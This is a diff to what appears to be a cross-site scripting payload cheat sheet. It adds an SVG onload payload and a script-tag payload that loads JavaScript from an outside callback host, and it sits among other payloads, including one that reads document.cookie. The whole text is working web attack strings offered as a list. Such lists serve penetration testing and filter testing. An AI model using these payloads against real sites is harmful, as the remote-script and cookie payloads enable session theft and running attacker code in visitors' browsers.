@@ -28,6 +28,10 @@ SVG
 
 `"><svg onload=alert(1)>`
 
+`<svg/onload=alert(1)>`
+
+`"></script><script src=//m0m0x01d.xss.ht></script>`
+
 `<img src=1 onerror=alert(1)>`
 
 `javascript:alert(document.cookie)`  -- In href senario
